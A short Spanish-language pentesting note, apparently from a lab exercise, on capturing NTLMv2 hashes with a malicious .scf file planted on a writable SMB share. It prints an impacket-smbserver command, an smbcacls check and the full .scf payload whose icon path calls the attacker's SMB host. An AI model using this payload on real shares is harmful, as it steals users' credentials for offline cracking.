Cuando tenemos una montura de un recurso compartido remoto, y tenemos capacidad de escritura en algún escritorio (confirmando con la herramienta _smbcacls_), podemos crear un archivo malicioso con extension .scf para que, sin interacción del usuario (unicamente es necesario que el directorio sea atravesado), obtengamos el hash NTLMv2 del usuario para poder crackearlo de forma offline.

Para ello lo primero sería mediante el uso de la herramienta _impacket-smbserver_ compartir un recurso a nivel de la network con el nombre de smbFolder:

`impacket-smbserver smbFolder $(pwd) -smb2support`

Una vez esto, vamos a crear el archivo malicioso .scf en la ruta donde tenemos capacidad de escritura (lo comprobamos con smbcacls: `smbcacls "//10.10.10.103/Department Shares" Users/Public | grep "Everyone"`). El archivo tiene la siguiente estructura:

```scf
[Shell]
Command=2
IconFile=\\10.10.14.21\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

En el momento que guardemos el archivo, si un usuario entra en el directorio donde lo hemos subido, al cargarse el ícono vamos a recibir el hash NTLMv2 del usuario y vamos a poder crackearlo por fuerza bruta de manera offline.
